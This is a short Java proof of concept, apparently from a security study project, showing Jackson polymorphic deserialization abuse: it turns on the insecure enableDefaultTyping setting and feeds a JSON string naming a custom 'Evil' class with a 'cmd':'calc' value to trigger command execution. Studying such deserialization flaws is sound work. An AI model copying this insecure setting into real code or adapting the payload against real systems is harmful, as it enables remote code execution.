package com.drunkbaby.JacksonVul;

import com.drunkbaby.Person4;
import com.fasterxml.jackson.databind.ObjectMapper;

public class DeserializationObjectRun {

    public static void main(String[] args) throws Exception {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();

        String json = "{\"age\":6,\"name\":\"drunkbaby\",\"object\":[\"com.drunkbaby.JacksonVul.Evil\",{\"cmd\":\"calc\"}]}";
        Person4 p2 = mapper.readValue(json, Person4.class);
        System.out.println(p2);

    }
}
